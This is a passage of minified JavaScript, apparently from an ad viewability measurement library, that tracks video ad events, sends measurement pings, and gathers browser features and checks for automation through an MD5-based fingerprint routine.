            Ll().setTimeout(hm(292, function() {
                return nq(a)
            }), 100)
        }, 292);
        return !0
    };
    var nq = function(a) {
            N().B = !!a.A("isViewable");
            mq(a, "viewableChange", oq);
            "loading" === a.A("getState") ? mq(a, "ready", pq) : qq(a)
        },
        qq = function(a) {
            "string" === typeof a.h.ya.AFMA_LIDAR ? (a.K = !0, rq(a)) : (a.h.Tb = 3, a.C = "nc", Xm(a, "w"))
        },
        rq = function(a) {
            a.J = !1;
            var b = 1 == wl(N().U, "rmmt"),
                c = !!a.A("isViewable");
            (b ? !c : 1) && Ll().setTimeout(hm(524, function() {
                a.J || (sq(a), im(540, Error()), a.C = "mt", Xm(a, "w"))
            }), 500);
            tq(a);
            mq(a, a.h.ya.AFMA_LIDAR, uq)
        },
        tq = function(a) {
            var b = 1 == wl(N().U, "sneio"),
                c = void 0 !== a.h.ya.AFMA_LIDAR_EXP_1,
                d =
                void 0 !== a.h.ya.AFMA_LIDAR_EXP_2;
            (b = b && d) && (a.h.ya.AFMA_LIDAR_EXP_2 = !0);
            c && (a.h.ya.AFMA_LIDAR_EXP_1 = !b)
        },
        sq = function(a) {
            a.A("removeEventListener", a.h.ya.AFMA_LIDAR, uq);
            a.K = !1
        };
    lq.prototype.R = function() {
        var a = O(),
            b = vq(this, "getMaxSize");
        a.g = new F(0, b.width, b.height, 0)
    };
    lq.prototype.T = function() {
        O().B = vq(this, "getScreenSize")
    };
    var vq = function(a, b) {
        if ("loading" === a.A("getState")) return new lf(-1, -1);
        b = a.A(b);
        if (!b) return new lf(-1, -1);
        a = parseInt(b.width, 10);
        b = parseInt(b.height, 10);
        return isNaN(a) || isNaN(b) ? new lf(-1, -1) : new lf(a, b)
    };
    lq.prototype.W = function() {
        sq(this);
        Vm.prototype.W.call(this)
    };
    var pq = function() {
            try {
                var a = G(lq);
                a.A("removeEventListener", "ready", pq);
                qq(a)
            } catch (b) {
                im(541, b)
            }
        },
        uq = function(a, b) {
            try {
                var c = G(lq);
                c.J = !0;
                var d = a ? new F(a.y, a.x + a.width, a.y + a.height, a.x) : new F(0, 0, 0, 0);
                var e = pm(),
                    f = Sm();
                var g = new rm(e, f, c);
                g.g = d;
                g.volume = b;
                c.Pa(g)
            } catch (h) {
                im(542, h)
            }
        },
        oq = function(a) {
            var b = N(),
                c = G(lq);
            a && !b.B && (b.B = !0, c.aa = !0, c.C && Xm(c, "w", !0))
        };
    var xq = function() {
        this.l = this.H = !1;
        this.g = null;
        this.o = new gq;
        this.h = null;
        var a = {};
        this.M = (a.start = this.Ne, a.firstquartile = this.Ie, a.midpoint = this.Ke, a.thirdquartile = this.Oe, a.complete = this.Ge, a.pause = this.Nc, a.resume = this.Ld, a.skip = this.Me, a.viewable_impression = this.Oa, a.mute = this.ub, a.unmute = this.ub, a.fullscreen = this.Je, a.exitfullscreen = this.He, a.fully_viewable_audible_half_duration_impression = this.Oa, a.measurable_impression = this.Oa, a.abandon = this.Nc, a.engagedview = this.Oa, a.impression = this.Oa, a.creativeview =
            this.Oa, a.progress = this.ub, a.custom_metric_viewable = this.Oa, a.bufferstart = this.Nc, a.bufferfinish = this.Ld, a);
        a = {};
        this.T = (a.overlay_resize = this.Le, a.abandon = this.Cc, a.close = this.Cc, a.collapse = this.Cc, a.overlay_unmeasurable_impression = function(b) {
                return Ho(b, "overlay_unmeasurable_impression", Sm())
            }, a.overlay_viewable_immediate_impression = function(b) {
                return Ho(b, "overlay_viewable_immediate_impression", Sm())
            }, a.overlay_unviewable_impression = function(b) {
                return Ho(b, "overlay_unviewable_impression", Sm())
            },
            a.overlay_viewable_end_of_session_impression = function(b) {
                return Ho(b, "overlay_viewable_end_of_session_impression", Sm())
            }, a);
        N().h = 3;
        wq(this)
    };
    xq.prototype.A = function(a) {
        Rn(a, !1);
        Zo(a)
    };
    xq.prototype.I = function() {};
    var yq = function(a, b, c, d) {
        a = a.C(null, d, !0, b);
        a.B = c;
        $o([a]);
        return a
    };
    xq.prototype.C = function(a, b, c, d) {
        var e = this;
        this.h || (this.h = this.sd());
        b = c ? b : -1;
        a = null == this.h || this.l ? new uo(D, a, b, 7) : new uo(D, a, b, 7, new mo("measurable_impression", this.h), zq(this));
        a.ia = d;
        ul(a.U);
        vl(a.U, "queryid", a.ia);
        a.Oc("");
        Wn(a, function(f) {
            for (var g = [], h = 0; h < arguments.length; ++h) g[h - 0] = arguments[h];
            return e.K.apply(e, ha(g))
        }, function(f) {
            for (var g = [], h = 0; h < arguments.length; ++h) g[h - 0] = arguments[h];
            return e.R.apply(e, ha(g))
        });
        (d = G(bp).g) && Sn(a, d);
        a.pa.Sa && G(op);
        return a
    };
    var Aq = function(a, b, c) {
            dl(b);
            var d = a.h;
            z(b, function(e) {
                var f = qb(e.l, function(g) {
                    var h = Zp(g);
                    if (null == h) g = null;
                    else if (g = new Yp, null != h.visible && (g.g = h.visible / 100), null != h.audible && (g.h = 1 == h.audible), null != h.time) {
                        var k = "mtos" == h.timetype ? "mtos" : "tos",
                            n = ic(h.time, "%") ? "%" : "ms";
                        h = parseInt(h.time, 10);
                        "%" == n && (h /= 100);
                        "ms" == n ? (g.l = h, g.o = -1) : (g.l = -1, g.o = h);
                        g.B = void 0 === k ? "tos" : k
                    }
                    return g
                });
                sb(f, function(g) {
                    return null == g
                }) || Ao(c, new aq(e.id, e.g, f, d))
            })
        },
        zq = function(a) {
            a = a.h;
            return [new cq("viewable_impression",
                a), new bq(a)]
        },
        Bq = function() {
            var a = [],
                b = N();
            a.push(G(np));
            wl(b.U, "mvp_lv") && a.push(G(lq));
            b = [new iq, new kq];
            b.push(new ep(a));
            b.push(new lp(D));
            return b
        },
        Dq = function(a) {
            if (!a.H) {
                a.H = !0;
                try {
                    var b = pm(),
                        c = N(),
                        d = O();
                    lm = b;
                    c.o = 79463069;
                    "o" !== a.g && (yp = Mg(D).ka);
                    if (Ml()) {
                        qp.g.ld = 0;
                        qp.g.Ec = pm() - b;
                        var e = Bq(),
                            f = G(bp);
                        f.h = e;
                        cp(f, function() {
                            Cq()
                        }) ? qp.done || (wp(), Ym(f.g.g, a), sp()) : d.l ? Cq() : sp()
                    } else Ap = !0
                } catch (g) {
                    throw Wo.reset(), g;
                }
            }
        },
        Eq = function(a) {
            qp.h.cancel();
            zp = a;
            qp.done = !0
        },
        Fq = function(a) {
            if (a.g) return a.g;
            var b = G(bp).g;
            if (b) switch (b.getName()) {
                case "nis":
                    a.g = "n";
                    break;
                case "gsv":
                    a.g = "m"
            }
            a.g || (a.g = "h");
            return a.g
        },
        Gq = function(a, b, c) {
            if (null == a.h) return b.wb |= 4, !1;
            a = a.h.report(c, b);
            b.wb |= a;
            return 0 == a
        };
    xq.prototype.rb = function(a) {
        switch (a.Ga()) {
            case 0:
                if (a = G(bp).g) a = a.g, xb(a.B, this), a.L && this.Ca() && an(a);
                Cq();
                break;
            case 2:
                sp()
        }
    };
    xq.prototype.Pa = function() {};
    xq.prototype.Ca = function() {
        return !1
    };
    var Cq = function() {
        var a = [new lp(D)],
            b = G(bp);
        b.h = a;
        cp(b, function() {
            Eq("i")
        }) ? qp.done || (wp(), sp()) : Eq("i")
    };
    xq.prototype.R = function(a, b) {
        a.$a = !0;
        switch (a.va()) {
            case 1:
                Hq(this, a, b);
                break;
            case 2:
                this.Qc(a)
        }
        this.Rc(a)
    };
    var Hq = function(a, b, c) {
        if (!b.sa) {
            var d = Ho(b, "start", Sm());
            a = a.o.g(d).g;
            var e = {
                id: "lidarv"
            };
            e.r = c;
            e.v = Sp + "v";
            Hf(a, function(f, g) {
                return e[f] = "mtos" == f || "tos" == f ? g : encodeURIComponent(g)
            });
            c = Bp();
            Hf(c, function(f, g) {
                return e[f] = encodeURIComponent(g)
            });
            c = "//pagead2.googlesyndication.com/pagead/gen_204?" + mn(kn(new hn, e));
            qn(c);
            b.sa = !0
        }
    };
    l = xq.prototype;
    l.Ne = function(a) {
        Eo(a, 0);
        return Ho(a, "start", Sm())
    };
    l.ub = function(a, b, c) {
        tp(qp, [a], !Sm());
        return this.Oa(a, b, c)
    };
    l.Oa = function(a, b, c) {
        return Ho(a, c, Sm())
    };
    l.Ie = function(a) {
        return Iq(a, "firstquartile", 1)
    };
    l.Ke = function(a) {
        a.$ = !0;
        return Iq(a, "midpoint", 2)
    };
    l.Oe = function(a) {
        return Iq(a, "thirdquartile", 3)
    };
    l.Ge = function(a) {
        var b = Iq(a, "complete", 4);
        0 != a.ea && (a.ea = 3);
        return b
    };
    var Iq = function(a, b, c) {
        tp(qp, [a], !Sm());
        Eo(a, c);
        4 != c && Do(a.K, c, a.Vb);
        return Ho(a, b, Sm())
    };
    l = xq.prototype;
    l.Ld = function(a, b, c) {
        b = Sm();
        2 != a.ea || b || (a.ra().I = pm());
        tp(qp, [a], !b);
        2 == a.ea && (a.ea = 1);
        return Ho(a, c, b)
    };
    l.Me = function(a, b) {
        b = this.ub(a, b || {}, "skip");
        0 != a.ea && (a.ea = 3);
        return b
    };
    l.Je = function(a, b) {
        Rn(a, !0);
        return this.ub(a, b || {}, "fullscreen")
    };
    l.He = function(a, b) {
        Rn(a, !1);
        return this.ub(a, b || {}, "exitfullscreen")
    };
    l.Nc = function(a, b, c) {
        b = a.ra();
        b.T = ko(b, pm(), 1 != a.ea);
        tp(qp, [a], !Sm());
        1 == a.ea && (a.ea = 2);
        return Ho(a, c, Sm())
    };
    l.Le = function(a) {
        tp(qp, [a], !Sm());
        return a.h()
    };
    l.Cc = function(a) {
        tp(qp, [a], !Sm());
        this.Jd(a);
        0 != a.ea && (a.ea = 3);
        return a.h()
    };
    var wq = function(a) {
            xp(function() {
                var b = Jq();
                null != a.g && (b.sdk = a.g);
                var c = G(bp);
                null != c.g && (b.avms = c.g.getName());
                return b
            })
        },
        Kq = function(a, b, c, d) {
            var e = Uo(Wo, c);
            null !== e && e.ia !== b && (a.A(e), e = null);
            e || (b = a.C(c, pm(), !1, b), 0 == Wo.h.length && (N().o = 79463069), ap([b]), e = b, e.B = Fq(a), d && (e.Ta = d));
            return e
        };
    xq.prototype.K = function() {};
    var Mq = function(a, b) {
        b.C = 0;
        for (var c in tm) null == a[c] && (b.C |= tm[c]);
        Lq(a, "currentTime");
        Lq(a, "duration")
    };
    l = xq.prototype;
    l.Qc = function() {};
    l.Jd = function() {};
    l.fd = function() {};
    l.Rc = function() {};
    l.sd = function() {};
    var Lq = function(a, b) {
            var c = a[b];
            void 0 !== c && 0 < c && (a[b] = Math.floor(1E3 * c))
        },
        Jq = function() {
            var a = O(),
                b = {};
            return b.sv = Sp, b["if"] = a.l ? "1" : "0", b.nas = String(Wo.g.length), b
        };
    var Nq = Ya(),
        Oq = !1,
        Pq = !1,
        Qq = !1,
        Rq = function(a) {
            return !a || "function" !== typeof a || 0 > String(Function.prototype.toString).indexOf("[native code]") ? !1 : 0 <= String(a).indexOf("[native code]") && !0 || !1
        },
        Sq = function(a) {
            return !!(1 << a & Nq)
        },
        Tq = [function(a) {
                return !(!a.chrome || !a.chrome.webstore)
            }, function(a) {
                return !!a.document.documentMode
            }, function(a) {
                return !!a.document.fonts.ready
            }, function() {
                return Sq(0)
            }, function(a) {
                return !!a.ActiveXObject
            }, function(a) {
                return !!a.chrome
            }, function(a) {
                return !!a.navigator.serviceWorker
            },
            function(a) {
                return !!a.opera
            },
            function(a) {
                return !!a.sidebar
            },
            function() {
                return !+"\v1"
            },
            function() {
                return Sq(1)
            },
            function(a) {
                return !a.ActiveXObject
            },
            function(a) {
                return "-ms-ime-align" in a.document.documentElement.style
            },
            function(a) {
                return "-ms-scroll-limit" in a.document.documentElement.style
            },
            function(a) {
                return "-webkit-font-feature-settings" in a.document.body.style
            },
            function() {
                return Sq(2)
            },
            function(a) {
                return "ActiveXObject" in a
            },
            function(a) {
                return "MozAppearance" in a.document.documentElement.style
            },
            function(a) {
                return "_phantom" in
                    a
            },
            function(a) {
                return "callPhantom" in a
            },
            function(a) {
                return "content" in a.document.createElement("template")
            },
            function(a) {
                return "getEntriesByType" in a.performance
            },
            function() {
                return Sq(3)
            },
            function(a) {
                return "image-rendering" in a.document.body.style
            },
            function(a) {
                return "object-fit" in a.document.body.style
            },
            function(a) {
                return "open" in a.document.createElement("details")
            },
            function(a) {
                return "orientation" in a.screen
            },
            function(a) {
                return "performance" in a
            },
            function(a) {
                return "shape-image-threshold" in a.document.body.style
            },
            function() {
                return Sq(4)
            },
            function(a) {
                return "srcset" in a.document.createElement("img")
            },
            function() {
                return Pq
            },
            function() {
                return Qq
            },
            function() {
                return Sq(5)
            },
            function(a) {
                a = a.document.createElement("div");
                a.style.width = "1px";
                a.style.width = "-webkit-min-content";
                a.style.width = "min-content";
                return "1px" != a.style.width
            },
            function(a) {
                a = a.document.createElement("div");
                a.style.width = "1px";
                a.style.width = "calc(1px - 1px)";
                a.style.width = "-webkit-calc(1px - 1px)";
                return "1px" != a.style.width
            },
            function() {
                var a = !1;
                eval('var DummyFunction1 = function(x){ "use strict"; var a = 12; b = a + x*35; }');
                try {
                    DummyFunction1()
                } catch (b) {
                    a = !0
                }
                return a
            },
            function() {
                var a = !1;
                try {
                    DummyFunction2()
                } catch (b) {
                    a = !0
                }
                return a
            },
            function() {
                return !1
            },
            function() {
                return Sq(6)
            },
            function(a) {
                var b = a.document.createElement("canvas");
                b.width = b.height = 1;
                b = b.getContext("2d");
                b.globalCompositeOperation = "multiply";
                b.fillStyle = "rgb(0,255,255)";
                b.fillRect(0, 0, 1, 1);
                b.fill();
                b.fillStyle = "rgb(255,255,0)";
                b.fillRect(0, 0, 1, 1);
                b.fill();
                b = b.getImageData(0, 0, 1, 1).data;
                return b[0] == b[2] && b[1] == b[3] || Rq(a.navigator.vibrate)
            },
            function(a) {
                a =
                    a.document.createElement("canvas");
                a.width = a.height = 1;
                a = a.getContext("2d");
                a.globalCompositeOperation = "multiply";
                a.fillStyle = "rgb(0,255,255)";
                a.fillRect(0, 0, 1, 1);
                a.fill();
                a.fillStyle = "rgb(255,255,0)";
                a.fillRect(0, 0, 1, 1);
                a.fill();
                a = a.getImageData(0, 0, 1, 1).data;
                return a[0] == a[2] && a[1] == a[3]
            },
            function(a) {
                return Rq(a.document.createElement("div").matches)
            },
            function(a) {
                a = a.document.createElement("input");
                a.setAttribute("type", "range");
                return "text" !== a.type
            },
            function(a) {
                return a.CSS.supports("image-rendering",
                    "pixelated")
            },
            function(a) {
                return a.CSS.supports("object-fit", "contain")
            },
            function() {
                return Sq(7)
            },
            function(a) {
                return a.CSS.supports("object-fit", "inherit")
            },
            function(a) {
                return a.CSS.supports("shape-image-threshold", "0.9")
            },
            function(a) {
                return a.CSS.supports("word-break", "keep-all")
            },
            function() {
                return eval("1 == [for (item of [1,2,3]) item][0]")
            },
            function(a) {
                return Rq(a.CSS.supports)
            },
            function() {
                return Rq(Intl.Collator)
            },
            function(a) {
                return Rq(a.document.createElement("dialog").show)
            },
            function() {
                return Sq(8)
            },
            function(a) {
                return Rq(a.document.createElement("div").animate([{
                    transform: "scale(1)",
                    easing: "ease-in"
                }, {
                    transform: "scale(1.3)",
                    easing: "ease-in"
                }], {
                    duration: 1300,
                    iterations: 1
                }).reverse)
            },
            function(a) {
                return Rq(a.document.createElement("div").animate)
            },
            function(a) {
                return Rq(a.document.documentElement.webkitRequestFullScreen)
            },
            function(a) {
                return Rq(a.navigator.getBattery)
            },
            function(a) {
                return Rq(a.navigator.permissions.query)
            },
            function() {
                return !1
            },
            function() {
                return Sq(9)
            },
            function() {
                return Rq(webkitRequestAnimationFrame)
            },
            function(a) {
                return Rq(a.BroadcastChannel.call)
            },
            function(a) {
                return Rq(a.FontFace)
            },
            function(a) {
                return Rq(a.Gamepad)
            },
            function() {
                return Sq(10)
            },
            function(a) {
                return Rq(a.MutationEvent)
            },
            function(a) {
                return Rq(a.MutationObserver)
            },
            function(a) {
                return Rq(a.crypto.getRandomValues)
            },
            function(a) {
                return Rq(a.document.body.createShadowRoot)
            },
            function(a) {
                return Rq(a.document.body.webkitCreateShadowRoot)
            },
            function(a) {
                return Rq(a.fetch)
            },
            function() {
                return Sq(11)
            },
            function(a) {
                return Rq(a.navigator.serviceWorker.register)
            },
            function(a) {
                return Rq(a.navigator.webkitGetGamepads)
            },
            function(a) {
                return Rq(a.speechSynthesis.speak)
            },
            function(a) {
                return Rq(a.webkitRTCPeerConnection)
            },
            function(a) {
                return a.CSS.supports("--fake-var", "0")
            },
            function() {
                return Sq(12)
            },
            function(a) {
                return a.CSS.supports("cursor", "grab")
            },
            function(a) {
                return a.CSS.supports("cursor", "zoom-in")
            },
            function(a) {
                return a.CSS.supports("image-orientation", "270deg")
            },
            function() {
                return Sq(13)
            },
            function(a) {
                return a.CSS.supports("position", "sticky")
            },
            function(a) {
                return void 0 ===
                    a.document.createElement("style").scoped
            },
            function(a) {
                return a.performance.getEntriesByType("resource") instanceof Array
            },
            function() {
                return "undefined" == typeof InstallTrigger
            },
            function() {
                return "object" == typeof(new Intl.Collator).resolvedOptions()
            },
            function(a) {
                return "boolean" == typeof a.navigator.onLine
            },
            function() {
                return Sq(14)
            },
            function(a) {
                return "undefined" == typeof a.navigator.Ch
            },
            function(a) {
                return "number" == typeof a.performance.now()
            },
            function() {
                return 0 == (new Uint16Array(1))[0]
            },
            function(a) {
                return -1 ==
                    a.ActiveXObject.toString().indexOf("native")
            },
            function(a) {
                return -1 == Object.prototype.toString.call(a.HTMLElement).indexOf("Constructor")
            }
        ],
        Uq = [function(a) {
                a = a.document.createElement("div");
                var b = null,
                    c = ["{45EA75A0-A269-11D1-B5BF-0000F8051515}", "{3AF36230-A269-11D1-B5BF-0000F8051515}", "{89820200-ECBD-11CF-8B85-00AA005B4383}"];
                try {
                    a.style.behavior = "url(#default#clientcaps)"
                } catch (e) {}
                for (var d = 0; d < c.length; d++) {
                    try {
                        b = a.getComponentVersion(c[d], "componentid").replace(/,/g, ".")
                    } catch (e) {}
                    if (b) return b.split(".")[0]
                }
                return !1
            },
            function() {
                return (new Date).getTimezoneOffset()
            },
            function(a) {
                return (a.innerWidth || a.document.documentElement.clientWidth || a.document.body.clientWidth) / (a.innerHeight || a.document.documentElement.clientHeight || a.document.body.clientHeight)
            },
            function(a) {
                return (a.outerWidth || a.document && a.document.body && a.document.body.offsetWidth) / (a.outerHeight || a.document && a.document.body && a.document.body.offsetHeight)
            },
            function(a) {
                return a.screen.availWidth / a.screen.availHeight
            },
            function(a) {
                return a.screen.width /
                    a.screen.height
            }
        ],
        Vq = [function(a) {
            return a.navigator.userAgent
        }, function(a) {
            return a.navigator.platform
        }, function(a) {
            return a.navigator.vendor
        }],
        Xq = function() {
            try {
                Wq()
            } catch (d) {}
            var a = "a=1&b=" + Nq + "&",
                b = [],
                c = 99;
            z(Tq, function(d, e) {
                var f = !1;
                try {
                    f = d(D)
                } catch (g) {}
                b[e / 32 >>> 0] |= f << e % 32
            });
            z(b, function(d, e) {
                a += String.fromCharCode(c + e) + "=" + (d >>> 0).toString(16) + "&"
            });
            c = 105;
            z(Uq, function(d) {
                var e = "false";
                try {
                    e = d(D)
                } catch (f) {}
                a += String.fromCharCode(c++) + "=" + e + "&"
            });
            z(Vq, function(d) {
                var e = "";
                try {
                    e = $d(d(D))
                } catch (f) {}
                a +=
                    String.fromCharCode(c++) + "=" + e + "&"
            });
            return a.slice(0, -1)
        },
        Wq = function() {
            if (!Oq) {
                var a = function() {
                    Pq = !0;
                    D.document.removeEventListener("webdriver-evaluate", a, !0)
                };
                D.document.addEventListener("webdriver-evaluate", a, !0);
                var b = function() {
                    Qq = !0;
                    D.document.removeEventListener("webdriver-evaluate-response", b, !0)
                };
                D.document.addEventListener("webdriver-evaluate-response", b, !0);
                Oq = !0
            }
        };
    var Yq = function() {
        this.blockSize = -1;
        this.blockSize = 64;
        this.g = Array(4);
        this.o = Array(this.blockSize);
        this.l = this.h = 0;
        this.reset()
    };
    Za(Yq, al);
    Yq.prototype.reset = function() {
        this.g[0] = 1732584193;
        this.g[1] = 4023233417;
        this.g[2] = 2562383102;
        this.g[3] = 271733878;
        this.l = this.h = 0
    };
    var Zq = function(a, b, c) {
            c || (c = 0);
            var d = Array(16);
            if ("string" === typeof b)
                for (var e = 0; 16 > e; ++e) d[e] = b.charCodeAt(c++) | b.charCodeAt(c++) << 8 | b.charCodeAt(c++) << 16 | b.charCodeAt(c++) << 24;
            else
                for (e = 0; 16 > e; ++e) d[e] = b[c++] | b[c++] << 8 | b[c++] << 16 | b[c++] << 24;
            b = a.g[0];
            c = a.g[1];
            e = a.g[2];
            var f = a.g[3];
            var g = b + (f ^ c & (e ^ f)) + d[0] + 3614090360 & 4294967295;
            b = c + (g << 7 & 4294967295 | g >>> 25);
            g = f + (e ^ b & (c ^ e)) + d[1] + 3905402710 & 4294967295;
            f = b + (g << 12 & 4294967295 | g >>> 20);
            g = e + (c ^ f & (b ^ c)) + d[2] + 606105819 & 4294967295;
            e = f + (g << 17 & 4294967295 | g >>>
                15);
            g = c + (b ^ e & (f ^ b)) + d[3] + 3250441966 & 4294967295;
            c = e + (g << 22 & 4294967295 | g >>> 10);
            g = b + (f ^ c & (e ^ f)) + d[4] + 4118548399 & 4294967295;
            b = c + (g << 7 & 4294967295 | g >>> 25);
            g = f + (e ^ b & (c ^ e)) + d[5] + 1200080426 & 4294967295;
            f = b + (g << 12 & 4294967295 | g >>> 20);
            g = e + (c ^ f & (b ^ c)) + d[6] + 2821735955 & 4294967295;
            e = f + (g << 17 & 4294967295 | g >>> 15);
            g = c + (b ^ e & (f ^ b)) + d[7] + 4249261313 & 4294967295;
            c = e + (g << 22 & 4294967295 | g >>> 10);
            g = b + (f ^ c & (e ^ f)) + d[8] + 1770035416 & 4294967295;
            b = c + (g << 7 & 4294967295 | g >>> 25);
            g = f + (e ^ b & (c ^ e)) + d[9] + 2336552879 & 4294967295;
            f = b + (g << 12 & 4294967295 |
                g >>> 20);
            g = e + (c ^ f & (b ^ c)) + d[10] + 4294925233 & 4294967295;
            e = f + (g << 17 & 4294967295 | g >>> 15);
            g = c + (b ^ e & (f ^ b)) + d[11] + 2304563134 & 4294967295;
            c = e + (g << 22 & 4294967295 | g >>> 10);
            g = b + (f ^ c & (e ^ f)) + d[12] + 1804603682 & 4294967295;
            b = c + (g << 7 & 4294967295 | g >>> 25);
            g = f + (e ^ b & (c ^ e)) + d[13] + 4254626195 & 4294967295;
            f = b + (g << 12 & 4294967295 | g >>> 20);
            g = e + (c ^ f & (b ^ c)) + d[14] + 2792965006 & 4294967295;
            e = f + (g << 17 & 4294967295 | g >>> 15);
            g = c + (b ^ e & (f ^ b)) + d[15] + 1236535329 & 4294967295;
            c = e + (g << 22 & 4294967295 | g >>> 10);
            g = b + (e ^ f & (c ^ e)) + d[1] + 4129170786 & 4294967295;
            b = c + (g <<
                5 & 4294967295 | g >>> 27);
            g = f + (c ^ e & (b ^ c)) + d[6] + 3225465664 & 4294967295;
            f = b + (g << 9 & 4294967295 | g >>> 23);
            g = e + (b ^ c & (f ^ b)) + d[11] + 643717713 & 4294967295;
            e = f + (g << 14 & 4294967295 | g >>> 18);
            g = c + (f ^ b & (e ^ f)) + d[0] + 3921069994 & 4294967295;
            c = e + (g << 20 & 4294967295 | g >>> 12);
            g = b + (e ^ f & (c ^ e)) + d[5] + 3593408605 & 4294967295;
            b = c + (g << 5 & 4294967295 | g >>> 27);
            g = f + (c ^ e & (b ^ c)) + d[10] + 38016083 & 4294967295;
            f = b + (g << 9 & 4294967295 | g >>> 23);
            g = e + (b ^ c & (f ^ b)) + d[15] + 3634488961 & 4294967295;
            e = f + (g << 14 & 4294967295 | g >>> 18);
            g = c + (f ^ b & (e ^ f)) + d[4] + 3889429448 & 4294967295;
            c =
                e + (g << 20 & 4294967295 | g >>> 12);
            g = b + (e ^ f & (c ^ e)) + d[9] + 568446438 & 4294967295;
            b = c + (g << 5 & 4294967295 | g >>> 27);
            g = f + (c ^ e & (b ^ c)) + d[14] + 3275163606 & 4294967295;
            f = b + (g << 9 & 4294967295 | g >>> 23);
            g = e + (b ^ c & (f ^ b)) + d[3] + 4107603335 & 4294967295;
            e = f + (g << 14 & 4294967295 | g >>> 18);
            g = c + (f ^ b & (e ^ f)) + d[8] + 1163531501 & 4294967295;
            c = e + (g << 20 & 4294967295 | g >>> 12);
            g = b + (e ^ f & (c ^ e)) + d[13] + 2850285829 & 4294967295;
            b = c + (g << 5 & 4294967295 | g >>> 27);
            g = f + (c ^ e & (b ^ c)) + d[2] + 4243563512 & 4294967295;
            f = b + (g << 9 & 4294967295 | g >>> 23);
            g = e + (b ^ c & (f ^ b)) + d[7] + 1735328473 & 4294967295;
            e = f + (g << 14 & 4294967295 | g >>> 18);
            g = c + (f ^ b & (e ^ f)) + d[12] + 2368359562 & 4294967295;
            c = e + (g << 20 & 4294967295 | g >>> 12);
            g = b + (c ^ e ^ f) + d[5] + 4294588738 & 4294967295;
            b = c + (g << 4 & 4294967295 | g >>> 28);
            g = f + (b ^ c ^ e) + d[8] + 2272392833 & 4294967295;
            f = b + (g << 11 & 4294967295 | g >>> 21);
            g = e + (f ^ b ^ c) + d[11] + 1839030562 & 4294967295;
            e = f + (g << 16 & 4294967295 | g >>> 16);
            g = c + (e ^ f ^ b) + d[14] + 4259657740 & 4294967295;
            c = e + (g << 23 & 4294967295 | g >>> 9);
            g = b + (c ^ e ^ f) + d[1] + 2763975236 & 4294967295;
            b = c + (g << 4 & 4294967295 | g >>> 28);
            g = f + (b ^ c ^ e) + d[4] + 1272893353 & 4294967295;
            f = b + (g << 11 & 4294967295 |
                g >>> 21);
            g = e + (f ^ b ^ c) + d[7] + 4139469664 & 4294967295;
            e = f + (g << 16 & 4294967295 | g >>> 16);
            g = c + (e ^ f ^ b) + d[10] + 3200236656 & 4294967295;
            c = e + (g << 23 & 4294967295 | g >>> 9);
            g = b + (c ^ e ^ f) + d[13] + 681279174 & 4294967295;
            b = c + (g << 4 & 4294967295 | g >>> 28);
            g = f + (b ^ c ^ e) + d[0] + 3936430074 & 4294967295;
            f = b + (g << 11 & 4294967295 | g >>> 21);
            g = e + (f ^ b ^ c) + d[3] + 3572445317 & 4294967295;
            e = f + (g << 16 & 4294967295 | g >>> 16);
            g = c + (e ^ f ^ b) + d[6] + 76029189 & 4294967295;
            c = e + (g << 23 & 4294967295 | g >>> 9);
            g = b + (c ^ e ^ f) + d[9] + 3654602809 & 4294967295;
            b = c + (g << 4 & 4294967295 | g >>> 28);
            g = f + (b ^ c ^ e) + d[12] +
                3873151461 & 4294967295;
            f = b + (g << 11 & 4294967295 | g >>> 21);
            g = e + (f ^ b ^ c) + d[15] + 530742520 & 4294967295;
            e = f + (g << 16 & 4294967295 | g >>> 16);
            g = c + (e ^ f ^ b) + d[2] + 3299628645 & 4294967295;
            c = e + (g << 23 & 4294967295 | g >>> 9);
            g = b + (e ^ (c | ~f)) + d[0] + 4096336452 & 4294967295;
            b = c + (g << 6 & 4294967295 | g >>> 26);
            g = f + (c ^ (b | ~e)) + d[7] + 1126891415 & 4294967295;
            f = b + (g << 10 & 4294967295 | g >>> 22);
            g = e + (b ^ (f | ~c)) + d[14] + 2878612391 & 4294967295;
            e = f + (g << 15 & 4294967295 | g >>> 17);
            g = c + (f ^ (e | ~b)) + d[5] + 4237533241 & 4294967295;
            c = e + (g << 21 & 4294967295 | g >>> 11);
            g = b + (e ^ (c | ~f)) + d[12] + 1700485571 &
                4294967295;
            b = c + (g << 6 & 4294967295 | g >>> 26);
            g = f + (c ^ (b | ~e)) + d[3] + 2399980690 & 4294967295;
            f = b + (g << 10 & 4294967295 | g >>> 22);
            g = e + (b ^ (f | ~c)) + d[10] + 4293915773 & 4294967295;
            e = f + (g << 15 & 4294967295 | g >>> 17);
            g = c + (f ^ (e | ~b)) + d[1] + 2240044497 & 4294967295;
            c = e + (g << 21 & 4294967295 | g >>> 11);
            g = b + (e ^ (c | ~f)) + d[8] + 1873313359 & 4294967295;
            b = c + (g << 6 & 4294967295 | g >>> 26);
            g = f + (c ^ (b | ~e)) + d[15] + 4264355552 & 4294967295;
            f = b + (g << 10 & 4294967295 | g >>> 22);
            g = e + (b ^ (f | ~c)) + d[6] + 2734768916 & 4294967295;
            e = f + (g << 15 & 4294967295 | g >>> 17);
            g = c + (f ^ (e | ~b)) + d[13] + 1309151649 &
                4294967295;
            c = e + (g << 21 & 4294967295 | g >>> 11);
            g = b + (e ^ (c | ~f)) + d[4] + 4149444226 & 4294967295;
            b = c + (g << 6 & 4294967295 | g >>> 26);
            g = f + (c ^ (b | ~e)) + d[11] + 3174756917 & 4294967295;
            f = b + (g << 10 & 4294967295 | g >>> 22);
            g = e + (b ^ (f | ~c)) + d[2] + 718787259 & 4294967295;
            e = f + (g << 15 & 4294967295 | g >>> 17);
            g = c + (f ^ (e | ~b)) + d[9] + 3951481745 & 4294967295;
            a.g[0] = a.g[0] + b & 4294967295;
            a.g[1] = a.g[1] + (e + (g << 21 & 4294967295 | g >>> 11)) & 4294967295;
            a.g[2] = a.g[2] + e & 4294967295;
            a.g[3] = a.g[3] + f & 4294967295
        },
        $q = function(a, b) {
            if (void 0 === c) var c = b.length;
            for (var d = c - a.blockSize,
                    e = a.o, f = a.h, g = 0; g < c;) {
                if (0 == f)
                    for (; g <= d;) Zq(a, b, g), g += a.blockSize;
                if ("string" === typeof b)
                    for (; g < c;) {
                        if (e[f++] = b.charCodeAt(g++), f == a.blockSize) {
                            Zq(a, e);
                            f = 0;
                            break
                        }
                    } else
                        for (; g < c;)
                            if (e[f++] = b[g++], f == a.blockSize) {
                                Zq(a, e);
                                f = 0;
                                break
                            }
            }
            a.h = f;
            a.l += c
        };
    var ar = function() {
        this.h = null
    };
    t(ar, gq);
    ar.prototype.g = function(a) {
